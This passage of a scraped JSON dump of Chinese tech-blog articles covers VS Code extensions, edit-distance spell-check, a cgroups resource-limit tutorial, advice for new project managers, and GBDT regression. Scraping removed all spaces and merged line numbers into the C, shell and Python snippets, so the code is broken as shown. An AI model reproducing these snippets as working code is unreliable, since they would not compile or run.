Togglecommentinline.\"`!psnip.rv=comment_inline(snip,START=\"/*\",END=\"*/\")`$0endsnippet动图演示不同的语言可以在对应的片段文件中定义并传入注释符号参数即可，有了这个功能就可以愉快的删除其它的vim注释插件了😀2赞收藏评论关于作者：keeliiIt’snotwhoyouareunderneath,it’swhatyoudothatdefinesyou个人主页·我的文章·5·", "url_object_id": "c528881ac1c8d1c7d99e285d0256bff1"},{"title": "2018 年最受欢迎的 VS Code 扩展插件合集", "url": "http://blog.jobbole.com/114319/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/ab5348ee803d45ffeb8d5cd807d2e478.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,2,4, ,·", "content": "原文出处：开源中国-达尔文VSCode是一个出色的代码编辑器，但真正使它强大的是它可用的扩展。在这篇文章中，我分享了一些我最喜欢的VSCode扩展，同时使用VSCode开发Web应用程序。WakaTime–根据编程活动自动生成度量标准，代码检测和时间跟踪。GitLens–GitLens增强了VisualStudioCode中内置的Git功能。例如commits搜索，历史记录和和查看代码作者身份，还能通过强大的比较命令获得有价值的见解等等。RESTClient–REST客户端允许您直接发送HTTP请求并在VisualStudioCode中查看响应。NpmIntellisense–VisualStudioCode插件，用于在import语句中自动填充npm模块。CodeSpellChecker–一个与camelCase代码配合使用的基本拼写检查程序。此拼写检查程序可以帮助捕获常见的拼写错误，同时保证减少误报的数量。AzureStorage–AzureStorage是微软Azure云提供的云端存储解决方案，当前支持的存储类型有Blob、Queue、File和Table。按照本教程从VSCode部署Web应用程序到Azure存储。NightOwl–一个非常适合夜猫子的VSCode主题。像是为喜欢深夜编码的人精心设计的。ProjectManager–它可以帮助您轻松访问项目。您可以利用它定义自己的收藏项目，或选择自动检测VSCode项目，Git，Mercurial和SVN存储库。TodoTree–此扩展可以快速搜索（使用ripgrep）您的工作区以获取TODO和FIXME等注释标记，并在资源管理器窗格的树视图中显示。单击树中的TODO将打开文件并将光标放在包含TODO的行上。TurboConsoleLog–自动执行编写日志消息的操作，此扩展使调试更加容易。你还知道哪些很酷的VSCode扩展插件？欢迎评论分享。英文作者：RICARDO1赞1收藏评论", "url_object_id": "508bbff9e4628435d712ed94cbc6fb66"},{"title": "基于海量词库的单词拼写检查、推荐到底是咋做的？", "url": "http://blog.jobbole.com/114358/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/03b5b99cd8b93d7c062277c5de23570b.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,0,7, ,·", "content": "原文出处：haolujun前言在我们日常应用中，应该遇到不少类似的状况：写文档时，单词拼写错误后，工具自动推荐一个相似且正确的拼写形式；使用搜狗输入法时，敲错某个字的拼音照样能够打出我们想要的汉字；利用搜索引擎进行搜索时，下拉框中自动列出与输入相近的词语。等等，不一一列举。这种功能是如何实现的呢？里面用到了哪些算法呢？本文就来介绍一个能够完成这个任务的算法。问题描述其实，这几个问题都能够转换成同一个问题：即对于给定的输入字符串T，在预先准备好的模式串集合Q中找到与输入串相似的模式串子集。那么如何得到准备好的这些模式串集合呢？我们可以通过数据挖掘等一些机制来得到。那么接下来的问题就是如何快速的从这个集合中找到与输入串相似的字符串？通常我们用最小编辑距离来表示两个字符串的相似程度。例如，对于输入串T，我们限制错误数小于等于2，即在预先准备好的模式集合中找所有与输入串编辑距离小于等于2的字符串。有什么算法能够快速完成这个任务呢？暴力算法遍历集合Q中的每个模式串P，分别计算其与输入串T的最小编辑距离，如果编辑距离小于指定的错误容忍度x，则输出这个模式串。时间复杂度：O(|Q|*n*m)，当|Q|很大时，速度将会很慢。那么这个算法可以优化么？可以！比如，第一个字很少有人输入错，所以我们可以在模式串集合Q中只对第一个字与输入串第一个字相同的那些字符串进行相似度计算，这样就能够减少相当多的算量，是一个可行方法。但是这也有问题，假若少部分人确实第一个字输入错了，那么这个算法找到的所有串也是错的，不能达到纠错的效果。所以，针对首字符过滤的优化算法有一定的局限性。步步优化我们仔细思考这个问题，由于模式串Q是一个集合，那么其中必定有大量的模式串有共同的前缀。能否利用这个前缀进行优化呢？优化1：利用两个词的相同前缀进行优化比如：字符串explore和explain，他们有公共的前缀，这就意味着他们与字符串explode的编辑矩阵的前几列值是相同的，不用重复计算，如下图红色部分所示。explore与explain无论与任何字符串计算编辑距离，编辑矩阵的前4列肯定一模一样。所以，如果我们已经计算过explore与某个串的编辑距离后，那么当计算该串与explain的编辑距离时，前4列可以复用，直接从第五列开始计算。到此，我们得到一个新的算法计算多模式的编辑距离：把模式串集合建立成一棵字典树，深度优先遍历这棵树，在遍历的过程中，不断更新编辑矩阵的某一个列，如果到达的节点是一个终结符，并且T与P（路径上的字符形成的字符串）的编辑距离小于指定的容忍度，则找到一个符合条件的串。优化2：剪枝虽然我们利用词前缀优化了算法，能够避免拥有相同前缀模式串的编辑矩阵的重复计算，但是必须要遍历所有节点。有没有什么办法能够在计算到某一深度后，根据一些限制条件能够剪去该子树其它剩余节点的计算呢？在搜索算法中，这种优化叫做剪枝。接下来我们讨论一下该如何设计一个剪枝函数。重新审视我们的编辑距离定义，其实可以看成是把字符串P和T分别拆分成两段，然后计算对应的段的编辑距离之和，如下图所示。字符串P和T分别拆分成两段，红色和绿色。红色部分之间的编辑距离与绿色部分之间的编辑距离之和即为字符串P和T的编辑距离。举个例子，更形象：例子1ed(\"explore\",\"express\")=ed(\"explo\",\"exp\")+ed(\"re\",\"ress\")1ed(\"explore\",\"express\")=ed(\"explo\",\"exp\")+ed(\"re\",\"ress\")例子2ed(\"explore\",\"express\")=ed(\"exp\",\"exp\")+ed(\"lore\",\"ress\")1ed(\"explore\",\"express\")=ed(\"exp\",\"exp\")+ed(\"lore\",\"ress\")例子3但是，并不是每种划分都是正确的，比如下面图所示：ed(\"ex\",\"exp\")+ed(\"plore\",\"ress\")=1+4=51ed(\"ex\",\"exp\")+ed(\"plore\",\"ress\")=1+4=5所以，最小编辑距离问题又相当于一个最优拆分，即对于字符串P中位置为i的字符，找到在T中的一个最优位置j，使得ed(P.prefix(i),T.prefix(j))+ed(P.suffix(i+1),T.suffix(j+1))1ed(P.prefix(i),T.prefix(j))+ed(P.suffix(i+1),T.suffix(j+1))最小。回到我们这个问题中来，如果我们限制P和T的最小编辑距离小于等于x，我们让p[i]分别匹配t[i-x],t[i-x+1],……,t[i],t[i+1],……t[i+x]，并找到其中前半段匹配的最小的编辑距离ed1=ed(p[1~i],t[1~j])，如果ed1大于x，我们则能推断出ed(p,t)也终将大于x（ed=ed1+ed2&gt;x）。为什么p[i]不匹配t[i-x-1]以及之前的位置呢？那是因为ed(p.prefix(i),t.prefix(i-x-1))&gt;x，因为必须至少在t.prefix(i-x-1)中插入x+1个字符才能保证字符串长度相等；同理p[i]也不能匹配t[i+x+1]及其之后的位置。所以，根据分段原则，最优匹配肯定出现在t[i-x]~t[i+x]之间，如果这个区间的最小编辑距离都大于x，那么我们无需对p[i+1]及其之后的字符进行匹配计算。例如：当遍历到蓝色节点l时，路径形成的字符串expl与T=exist满足剪枝条件，则后序节点不需要遍历，因为后面不可能有任何一个字符串满足与T的编辑距离小于2。至此，我们得到了剪枝优化：深度遍历到达字典树的某个节点，其路径上的字符组成字符串P，计算其与T.prefix(i-x),T.prefix(i-x+1),……T.prefix(i+x)的最小编辑距离，如果其中的最小值大于x，则停止遍历这棵子树上的后面的节点。其实，这个最终版本的优化算法出自论文：《Error-tolerantfinite-staterecognitionwithapplicationstomorphologicalanalysisandspellingcorrection》.KOflazer:1996代码实现与效果对比代码实现需需要很强的技巧性，因为无论是剪枝函数还是进行最终确认函数都可以复用同一个编辑矩阵，贴一个很丑陋的代码：https://github.com/haolujun/Algorithm/tree/master/muti-edit-distance这个算法在错误容忍度非常小的情况下效率非常高，我随机生成了10万个长度5~10的模式串，再随机生成100个输入串T（长度5~10），字符集大小为10，x最小编辑距离限制，计算多模式编辑距离，处理总时间如下，单位ms：算法x=1x=2x=3x=4x=5x=6暴力算法219902199021990219902199021990优化算法979224248113612009728000当容忍度很小时，优化算法完胜暴力算法，并且实际应用中x一般取值都非常小，正好适合优化算法。当x值增大，优化算法效率逐渐下降，并且最后慢于暴力算法，这是因为优化算法实现复杂导致（递归+更复杂的判断）。所以，最终应用时，我们根据x值选择不同的算法。1赞收藏评论", "url_object_id": "4709f20bc9cfd6faeaaa14c497085b04"},{"title": "Linux cgroups 命令简介", "url": "http://blog.jobbole.com/114311/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,2,3, ,·", "content": "原文出处：sparkdevcgroups(ControlGroups)是linux内核提供的一种机制，这种机制可以根据需求把一系列系统任务及其子任务整合(或分隔)到按资源划分等级的不同组内，从而为系统资源管理提供一个统一的框架。简单说，cgroups可以限制、记录任务组所使用的物理资源。本质上来说，cgroups是内核附加在程序上的一系列钩子(hook)，通过程序运行时对资源的调度触发相应的钩子以达到资源追踪和限制的目的。本文以Ubuntu16.04系统为例介绍cgroups，所有的demo均在该系统中演示。为什么要了解cgroups在以容器技术为代表的虚拟化技术大行其道的时代了解cgroups技术是非常必要的！比如我们可以很方便的限制某个容器可以使用的CPU、内存等资源，这究竟是如何实现的呢？通过了解cgroups技术，我们可以窥探到linux系统中整个资源限制系统的脉络。从而帮助我们更好的理解和使用linux系统。cgroups的主要作用实现cgroups的主要目的是为不同用户层面的资源管理提供一个统一化的接口。从单个任务的资源控制到操作系统层面的虚拟化，cgroups提供了四大功能：资源限制：cgroups可以对任务是要的资源总额进行限制。比如设定任务运行时使用的内存上限，一旦超出就发OOM。优先级分配：通过分配的CPU时间片数量和磁盘IO带宽，实际上就等同于控制了任务运行的优先级。资源统计：cgoups可以统计系统的资源使用量，比如CPU使用时长、内存用量等。这个功能非常适合当前云端产品按使用量计费的方式。任务控制：cgroups可以对任务执行挂起、恢复等操作。相关概念Task(任务)在linux系统中，内核本身的调度和管理并不对进程和线程进行区分，只是根据clone时传入的参数的不同来从概念上区分进程和线程。这里使用task来表示系统的一个进程或线程。Cgroup(控制组)cgroups中的资源控制以cgroup为单位实现。Cgroup表示按某种资源控制标准划分而成的任务组，包含一个或多个子系统。一个任务可以加入某个cgroup，也可以从某个cgroup迁移到另一个cgroup。Subsystem(子系统)cgroups中的子系统就是一个资源调度控制器(又叫controllers)。比如CPU子系统可以控制CPU的时间分配，内存子系统可以限制内存的使用量。以笔者使用的Ubuntu16.04.3为例，其内核版本为4.10.0，支持的subsystem如下(cat/proc/cgroups)：blkio对块设备的IO进行限制。cpu限制CPU时间片的分配，与cpuacct挂载在同一目录。cpuacct生成cgroup中的任务占用CPU资源的报告，与cpu挂载在同一目录。cpuset给cgroup中的任务分配独立的CPU(多处理器系统)和内存节点。devices允许或禁止cgroup中的任务访问设备。freezer暂停/恢复cgroup中的任务。hugetlb限制使用的内存页数量。memory对cgroup中的任务的可用内存进行限制，并自动生成资源占用报告。net_cls使用等级识别符（classid）标记网络数据包，这让Linux流量控制器（tc指令）可以识别来自特定cgroup任务的数据包，并进行网络限制。net_prio允许基于cgroup设置网络流量(netoworktraffic)的优先级。perf_event允许使用perf工具来监控cgroup。pids限制任务的数量。Hierarchy(层级)层级有一系列cgroup以一个树状结构排列而成，每个层级通过绑定对应的子系统进行资源控制。层级中的cgroup节点可以包含零个或多个子节点，子节点继承父节点挂载的子系统。一个操作系统中可以有多个层级。cgroups的文件系统接口cgroups以文件的方式提供应用接口，我们可以通过mount命令来查看cgroups默认的挂载点：$mount|grepcgroup1$mount|grepcgroup第一行的tmpfs说明/sys/fs/cgroup目录下的文件都是存在于内存中的临时文件。第二行的挂载点/sys/fs/cgroup/systemd用于systemd系统对cgroups的支持，相关内容笔者今后会做专门的介绍。其余的挂载点则是内核支持的各个子系统的根级层级结构。需要注意的是，在使用systemd系统的操作系统中，/sys/fs/cgroup目录都是由systemd在系统启动的过程中挂载的，并且挂载为只读的类型。换句话说，系统是不建议我们在/sys/fs/cgroup目录下创建新的目录并挂载其它子系统的。这一点与之前的操作系统不太一样。下面让我们来探索一下/sys/fs/cgroup目录及其子目录下都是些什么：/sys/fs/cgroup目录下是各个子系统的根目录。我们以memory子系统为例，看看memory目录下都有什么？这些文件就是cgroups的memory子系统中的根级设置。比如memory.limit_in_bytes中的数字用来限制进程的最大可用内存，memory.swappiness中保存着使用swap的权重等等。既然cgroups是以这些文件作为API的，那么我就可以通过创建或者是修改这些文件的内容来应用cgroups。具体该怎么做呢？比如我们怎么才能限制某个进程可以使用的资源呢？接下来我们就通过简单的demo来演示如何使用cgroups限制进程可以使用的资源。查看进程所属的cgroups可以通过/proc/[pid]/cgroup来查看指定进程属于哪些cgroup：每一行包含用冒号隔开的三列，他们的含义分别是：cgroup树的ID，和/proc/cgroups文件中的ID一一对应。和cgroup树绑定的所有subsystem，多个subsystem之间用逗号隔开。这里name=systemd表示没有和任何subsystem绑定，只是给他起了个名字叫systemd。进程在cgroup树中的路径，即进程所属的cgroup，这个路径是相对于挂载点的相对路径。既然cgroups是以这些文件作为API的，那么我就可以通过创建或者是修改这些文件的内容来应用cgroups。具体该怎么做呢？比如我们怎么才能限制某个进程可以使用的资源呢？接下来我们就通过简单的demo来演示如何使用cgroups限制进程可以使用的资源。cgroups工具在介绍通过systemd应用cgroups之前，我们先使用cgroup-bin工具包中的cgexec来演示demo。Ubuntu默认没有安装cgroup-bin工具包，请通过下面的命令安装：$sudoaptinstallcgroup-bin1$sudoaptinstallcgroup-bindemo：限制进程可用的CPU在我们使用cgroups时，最好不要直接在各个子系统的根目录下直接修改其配置文件。推荐的方式是为不同的需求在子系统树中定义不同的节点。比如我们可以在/sys/fs/cgroup/cpu目录下新建一个名称为nick_cpu的目录：$cd/sys/fs/cgroup/cpu$sudomkdirnick_cpu12$cd/sys/fs/cgroup/cpu$sudomkdirnick_cpu然后查看新建的目录下的内容：是不是有点吃惊，cgroups的文件系统会在创建文件目录的时候自动创建这些配置文件！让我们通过下面的设置把CPU周期限制为总量的十分之一：$sudosu$echo100000&gt;nick_cpu/cpu.cfs_period_us$echo10000&gt;nick_cpu/cpu.cfs_quota_us123$sudosu$echo100000&gt;nick_cpu/cpu.cfs_period_us$echo10000&gt;nick_cpu/cpu.cfs_quota_us上面的两个参数眼熟吗？没错，笔者在《Docker:限制容器可用的CPU》一文中介绍的“–cpu-period=100000–cpu-quota=200000”就是由它们实现的。然后创建一个CPU密集型的程序：voidmain(){unsignedinti,end;end=1024*1024*1024;for(i=0;i&lt;end;){i++;}}12345678910voidmain(){unsignedinti,end;end=1024*1024*1024;for(i=0;i&lt;end;){i++;}}保存为文件cputime.c编译并通过不同的方式执行：$gcccputime.c-ocputime$sudosu$time./cputime$timecgexec-gcpu:nick_cpu./cputime1234$gcccputime.c-ocputime$sudosu$time./cputime$timecgexec-gcpu:nick_cpu./cputimetime命令可以为我们报告程序执行消耗的时间，其中的real就是我们真实感受到的时间。使用cgexec能够把我们添加的cgroup配置nick_cpu应用到运行cputime程序的进程上。上图显示，默认的执行只需要2s左右。通过cgroups限制CPU资源后需要运行23s。demo：限制进程可用的内存这次我们来限制进程可用的最大内存，在/sys/fs/cgroup/memory下创建目录nick_memory：$cd/sys/fs/cgroup/memory$sudomkdirnick_memory12$cd/sys/fs/cgroup/memory$sudomkdirnick_memory下面的设置把进程的可用内存限制在最大300M，并且不使用swap：#物理内存+SWAP&lt;=300MB；1024*1024*300=314572800$sudosu$echo314572800&gt;nick_memory/memory.limit_in_bytes$echo0&gt;nick_memory/memory.swappiness1234#物理内存+SWAP&lt;=300MB；1024*1024*300=314572800$sudosu$echo314572800&gt;nick_memory/memory.limit_in_bytes$echo0&gt;nick_memory/memory.swappiness然后创建一个不断分配内存的程序，它分五次分配内存，每次申请100M：#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#defineCHUNK_SIZE1024*1024*100voidmain(){char*p;inti;for(i=0;i&lt;5;i++){p=malloc(sizeof(char)*CHUNK_SIZE);if(p==NULL){printf(\"failtomalloc!\");return;}//memset()函数用来将指定内存的前n个字节设置为特定的值memset(p,0,CHUNK_SIZE);printf(\"mallocmemory%dMB\\n\",(i+1)*100);}}123456789101112131415161718192021222324#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#defineCHUNK_SIZE1024*1024*100voidmain(){char*p;inti;for(i=0;i&lt;5;i++){p=malloc(sizeof(char)*CHUNK_SIZE);if(p==NULL){printf(\"failtomalloc!\");return;}//memset()函数用来将指定内存的前n个字节设置为特定的值memset(p,0,CHUNK_SIZE);printf(\"mallocmemory%dMB\\n\",(i+1)*100);}}把上面的代码保存为mem.c文件，然后编译：$gccmem.c-omem1$gccmem.c-omem执行生成的mem程序：$./mem1$./mem此时一切顺利，然后加上刚才的约束试试：$cgexec-gmemory:nick_memory./mem1$cgexec-gmemory:nick_memory./mem由于内存不足且禁止使用swap，所以被限制资源的进程在申请内存时被强制杀死了。下面再使用stress程序测试一个类似的场景(通过stress程序申请500M的内存)：$sudocgexec-gmemory:nick_memorystress--vm1--vm-bytes500000000--vm-keep--verbose1$sudocgexec-gmemory:nick_memorystress--vm1--vm-bytes500000000--vm-keep--verbosestress程序能够提供比较详细的信息，进程被杀掉的方式是收到了SIGKILL(signal9)信号。实际应用中往往要同时限制多种的资源，比如既限制CPU资源又限制内存资源。使用cgexec实现这样的用例其实很简单，直接指定多个-g选项就可以了：$cgexec-gcpu:nick_cpu-gmemory:nick_memory./cpumem1$cgexec-gcpu:nick_cpu-gmemory:nick_memory./cpumem总结cgroups是linux内核提供的功能，由于牵涉的概念比较多，所以不太容易理解。本文试图在介绍概念性内容的同时，用最简单的demo演示cgroups的用法。希望直观的demo能够帮助大家理解cgroups。参考：LinuxControlGroup简介1赞1收藏评论", "url_object_id": "38e12d9177117bb18c9b4d7c45adfd75"},{"title": "从技术转管理，我做了什么来拯救自己？", "url": "http://blog.jobbole.com/113815/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/11/90129c6662feee86738bd3663ce83108.png"], "praise_nums": 2, "fav_nums": 2, "comments_nums": 2, "tags": "2,0,1,8,/,0,9,/,0,4, ,·", "content": "本文作者：伯乐在线-zer0Black。未经作者许可，禁止转载！欢迎加入伯乐在线专栏作者。我是一名新手项目经理，转项目管理岗1年半。在做管理之前，我是一名开发。也就是说，我是最常见的技术转管理了。最开始，我极度不适应这个岗位。很累，但是不见成效。经过一年多的摸索，我终于在工作中总结出了一些心得，一些套路。所以我想给技术转管理的同学们讲一讲：我做了什么，来拯救自己个人背景和公司背景1.目前为止工作4年半，也就是说，我做了3年开发，1年半管理2.我是一名野生程序员（就是非计算机专业毕业）3.我写过Android、iOS、web页面、java后端、python后端等等，看起来像传说中的全栈程序员。但其实心知肚明，我就是那种啥都会但啥也不行的程序员4.公司此前做产品，后来在产品的基础上转型外包扩大规模5.公司转型的基础上，我也转型成了管理6.我司项目经理是一个专门的职位，负责项目管理、技术架构、客户对接。总之项目的一切相关问题，包括技术问题，都由项目经理负责我做了什么事必躬亲，会毁了团队也会毁了自己这恐怕是所有从技术转管理的人，都会犯的通病。我刚开始带团队的时候，核心代码都要自己写。然后看同事进度的时候总是嫌这个慢，那个不行的。看不下去了索性自己上手吭哧吭哧写好。弄得自己非常疲惫。通常技术能力强的人，更有机会转型管理岗。所以在带团队的过程中，总是情不自禁的亲自动手完成别人应该做的事情。最终结果就是总会替代同事做他们自己本应该做的事情。但这个行为对管理者来说，只会让管理者越来越疲惫。而对整个团队来说，更是温水煮青蛙，一步一步把团队带进深渊。管理者负担太多工作，导致团队长期无法成长。轻则导致管理者累崩。重则导致项目崩塌、团队分崩离析。我应该怎么办：实际上，影响别人去做好一件事，比亲自去做要难的多。而我处理这个问题的方式1.忍住自己亲自动手的心理2.复杂任务拆解细化，分派任务时明确任务目标和验收标准3.分派任务时给予同事鼓励，对他们保持充分信任4.有难度的任务，提供一定的辅助或者培训多想、多说、多做我开始带团队的时候，一直忙于处理各种各样的项目问题，写代码、沟通需求、进度汇报、现场演示。大部分时间都埋头于项目本身，以为只要把项目做好，按时交付就行。做的太多，导致思考的时间少了，对团队同事的关注也就少了。而一个团队领导者，多做是应该的，更重要的是多思考，多说思考什么：1.项目干系人是否清楚，干系人不清楚会导致项目管理混乱，出的东西不满足要求2.需求是否合理，需求是否可以优化、技术架构是否满足需求3.功能是否拆解到位，任务分派是否可合理4.若尝试新技术，是否有把握在出问题的时候力挽狂澜5.团队成员状态如何，要如何激励他们6.项目流程是否合理，如何改进7.项目成本如何控制，时间节点如何把握，质量如何保证以上都是我目前每个项目都会思考的问题。项目管理者一定要告诫自己：不要用战术上的勤奋掩盖战略上的懒惰说什么：1.需求不清楚要问2.需求可以优化要说，不要闷声发大财，坑的是自己3.有困难处理不了要及时汇报给领导，悉知客户4.团队成员有问题要给予正确指导，而不是放任自由5.进度情况、项目情况要积极和客户保持沟通不仅是监督，更要是指引“那个功能写完了吗？”；“这个功能怎么还没做好”；“你这个东西什么时候能够写完”。以上是我日常工作中最常做的事情，即便到了目前，我依然在做这些事。监督催促同事干活！每天像个监工一样，漫步在同事周围，监督他们的进度，在他们耳边逼逼叨。但我认为，催促同事干活的不应该是项目经理，而是项目流程，是规则。每个人明确自己的角色，各司其职，由规则约束着大家前行。而不是简单靠项目经理赶着大家往前走。但我并没有做好这个工作，目前还是处于制定计划、监督执行的死循环中。对于规则、流程只是有个模糊的想法，还不成型，也未经试验。暂不与大家分享。救火能力固然重要，但更要防范于未然我由技术转管理的初期，最擅长的事情就是技术。所以一直在项目中充当救火队员的角色。有突发情况？我自己来；没有人能攻克技术难点？那我自己来；开发了很久，发现需求理解错误？咔咔咔自己一顿改；总之就是这有问题，咔咔咔自己一顿弄，那有问题，嗒嗒嗒自己一顿搞。总用自己的技术能力挽救项目中的各种突发情况。而作为一个项目管理者，救火能力固然重要，要在关键时刻能够站出来力挽狂澜。但更重要的，我想是如何去避免突发情况吧。而要避免突发情况，就要思考如何做好风险管理。提早做好准备，把可能出现的未知风险扼杀在襁褓中。在IT项目管理中，我认为风险主要存在于以下几点，应思考准备以便规避风险：1.需求变更。开发中需求变更是难免的，但如何控制需求变更，如何管理需求变更是我们着重要考虑的问题。SCALPEL方法，大家可以了解一下2.项目干系人不清楚，导致项目需求分歧3.技术难点预估不足。总是会存在开发过程中才发某项功能无法实现或者实现成本过高，这主要是由于前期对需求理解不足，对自我或团队太自信造成的4.计划制定问题。开发计划制定有问题，可能由于错误的估计了团队的能力，项目的难度造成的。计划风险通常是由项目经理自己造成，需自我强化、学习、思考来避免此问题5.组织成员问题。开发成员不足、人员离职、其它项目需紧急支援人手、团队沟通不畅都可能引起此问题6.流程风险。过于流程化，导致流程工作占用太多开发时间，流程和灵活是一对冲突的概念。如何解决项目管理中流程化和灵活度的问题，我认为是项目经理较重要的能力之一7.性能问题。开发过程中，最怕的是功能做完了，最后发现性能不行。导致前期开发工作全白费。所以在需求阶段，软件的用户量，数据量都是要考虑在内的。在开发之初，就要在程序设计过程中将性能问题考虑进去保持内心强大项目管理是一个磨人的工作。虽然外面说要做风险管理，但突发情况避免不了。一个合格的项目管理者，要有泰山崩于前而色不变的内心。需求变了不要紧、计划变了不要紧、成员情况发生变化不要紧。毕竟我们都知道世界上唯一不变的就是变化，尽可能的给自己准备好PlanB背黑锅要上，邀功也要上我相信各位做开发的时候，最讨厌的就是那种黑锅你背，有功他领的leader。既然如此，希望我们也不要变成这样的人。项目经理嘛，统管这个项目的一切。项目出了问题，不管因为什么原因，都一定是项目经理的责任。你的同事可能在项目里表现不佳，你的客户可能经常变更需求。不管多少理由，都不是你甩锅的理由。有锅一定要自己扛着，所以，背黑锅要上。做的好，也要说出来。超出客户预期的项目闪光点，要告诉客户团队的优秀。项目完成的不错，要告诉老板团队的优秀。让客户让老板知道你们团队做的好，下一次他们才会给你们更充分的信任。项目成员表现优秀的地方，不光要表扬，也要和上级说。你是和你团队成员接触最紧密的人，他们的有点别人不知道，但你知道。所以他们优秀的地方，要宣扬，要让别的部门知道，要让上级知道。所以邀功也要上。在帮派里，不能为兄弟们挡刀并引领兄弟们前进的老大是不值得追随的，弟兄们在你手下做事受尽委屈，争不了一口气，那这个老大也做不长。技术出身的管理者中，我相信背黑锅要上是大家都能做到的。但技术人员不善言辞，总是闷头干活，不会表达。所以要适当学会邀功，为团队邀功。希望大家都能学会邀功也要上不要抛弃技术，它可能是你的救命良药做项目管理以后，尤其是像我现在这种一个人带多个项目的情况。管理工作会占用每天极多的时间。这是工作本身需要你做的，无可厚非。我想说的是，即便如此，也要保证自己对技术的学习。了解新技术也好，写写开源项目也好，总之要保持对技术的持续学习。他总能在你需要的时候帮到你。学如逆水行舟,不进则退，与大家共勉总结总体而言，我认为一个新手项目经理，要学会以下事情：1.要学会带领团队成长，不要事必躬亲2.要多进行思考3.要学会风险管理4.要保持内心的强大5.要学会邀功以上，就是我想和大家分享的内容，其中很多点，我自己做的也不是很好，依然需要自我练习和努力。希望各位技术转管理的同学，都能尽快适应自己的工作。2赞2收藏2评论关于作者：zer0Black目前工作为移动开发，兴趣广泛，计算机各方面均有强烈兴趣。个人主页·我的文章·26·", "url_object_id": "34647675114e93c21bd8bb2e9ed09743"},{"title": "GBDT 回归的原理与 Python 实现", "url": "http://blog.jobbole.com/114351/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/09/9e08e0b08f1c54458be8116208d9b31c.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,9,/,0,5, ,·", "content": "本文作者：伯乐在线-伯乐在线读者。未经作者许可，禁止转载！欢迎加入伯乐在线专栏作者。提到GBDT回归相信大家应该都不会觉得陌生（不陌生你点进来干嘛[捂脸]），本文就GBDT回归的基本原理进行讲解，并手把手、肩并肩地带您实现这一算法。完整实现代码请参考本人的p…哦不是…github：gbdt_base.pygithub.comgbdt_regressor.pygithub.comgbdt_regressor_example.pygithub.com1.原理篇我们用人话而不是大段的数学公式来讲讲GBDT回归是怎么一回事。1.1温故知新回归树是GBDT的基础，之前的一篇文章曾经讲过回归树的原理和实现。链接如下：李小文：回归树的原理与Python实现zhuanlan.zhihu.com1.2预测年龄仍然以预测同事年龄来举例，从《回归树》那篇文章中我们可以知道，如果需要通过一个常量来预测同事的年龄，平均值是最佳的选择之一。1.3年龄的残差我们不妨假设同事的年龄分别为5岁、6岁、7岁，那么同事的平均年龄就是6岁。所以我们用6岁这个常量来预测同事的年龄，即[6,6,6]。每个同事年龄的残差=年龄–预测值=[5,6,7]–[6,6,6]，所以残差为[-1,0,1]1.4预测年龄的残差为了让模型更加准确，其中一个思路是让残差变小。如何减少残差呢？我们不妨对残差建立一颗回归树，然后预测出准确的残差。假设这棵树预测的残差是[-0.9,0,0.9]，将上一轮的预测值和这一轮的预测值求和，每个同事的年龄=[6,6,6]+[-0.9,0,0.9]=[5.1,6,6.9]，显然与真实值[5,6,7]更加接近了，年龄的残差此时变为[-0.1,0,0.1]。显然，预测的准确性得到了提升。1.5GBDT重新整理一下思路，假设我们的预测一共迭代3轮年龄：[5,6,7]第1轮预测：[6,6,6](平均值)第1轮残差：[-1,0,1]第2轮预测：[6,6,6](平均值)+[-0.9,0,0.9](第1颗回归树)=[5.1,6,6.9]第2轮残差：[-0.1,0,0.1]第3轮预测：[6,6,6](平均值)+[-0.9,0,0.9](第1颗回归树)+[-0.08,0,0.07](第2颗回归树)=[5.02,6,6.97]第3轮残差：[-0.08,0,0.03]看上去残差越来越小，而这种预测方式就是GBDT算法。1.6公式推导看到这里，相信您对GBDT已经有了直观的认识。这么做有什么科学依据么，为什么残差可以越来越小呢？前方小段数学公式低能预警。假设要做m轮预测，预测函数为Fm，初始常量或每一轮的回归树为fm，输入变量为X，有：设要预测的变量为y，采用MSE作为损失函数：我们知道泰勒公式的一阶展开式是长成这个样子滴：如果：那么，根据式3和式4可以得出：根据式2可以知道，损失函数的一阶偏导数为:根据式6可以知道，损失函数的二阶偏导数为：蓄力结束，开始放大招。根据式1，损失函数的一阶导数为：根据式5，将式8进一步展开为：令式9，即损失函数的一阶偏导数为0，那么：将式6，式7代入式9得到：因此，我们需要通过用第m-1轮残差的均值来得到函数fm，进而优化函数Fm。而回归树的原理就是通过最佳划分区域的均值来进行预测。所以fm可以选用回归树作为基础模型，将初始值，m-1颗回归树的预测值相加便可以预测y。2.实现篇本人用全宇宙最简单的编程语言——Python实现了GBDT回归算法，没有依赖任何第三方库，便于学习和使用。简单说明一下实现过程，更详细的注释请参考本人github上的代码。2.1导入回归树类回归树是我之前已经写好的一个类，在之前的文章详细介绍过，代码请参考：regression_tree.pygithub.comfrom..tree.regression_treeimportRegressionTree1from..tree.regression_treeimportRegressionTree2.2创建GradientBoostingBase类初始化，存储回归树、学习率、初始预测值和变换函数。（注：回归不需要做变换，因此函数的返回值等于参数）classGradientBoostingBase(object):def__init__(self):self.trees=Noneself.lr=Noneself.init_val=Noneself.fn=lambdax:x123456classGradientBoostingBase(object):def__init__(self):self.trees=Noneself.lr=Noneself.init_val=Noneself.fn=lambdax:x2.3计算初始预测值初始预测值即y的平均值。def_get_init_val(self,y):returnsum(y)/len(y)12def_get_init_val(self,y):returnsum(y)/len(y)2.4计算残差def_get_residuals(self,y,y_hat):return[yi-self.fn(y_hat_i)foryi,y_hat_iinzip(y,y_hat)]12def_get_residuals(self,y,y_hat):return[yi-self.fn(y_hat_i)foryi,y_hat_iinz